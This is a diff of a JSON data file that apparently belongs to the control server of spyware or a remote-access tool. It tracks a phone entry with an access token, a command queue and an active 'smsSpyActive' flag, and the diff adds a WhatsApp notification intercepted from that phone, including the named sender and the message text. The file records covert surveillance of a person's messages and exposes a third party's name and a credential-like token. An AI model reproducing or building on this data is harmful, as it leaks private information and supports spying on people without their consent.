@@ -2181,7 +2181,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777768907957,
+    "lastSeen": 1777768923005,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -2197,6 +2197,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "PP AZKHAL MUSTOFA CIKUDA",
+        "content": "‎5 pesan baru",
+        "time": "03/05 07:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777768909589
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎PP AZKHAL MUSTOFA CIKUDA (5 pesan): ~ MUSTOFA ARAFAT",
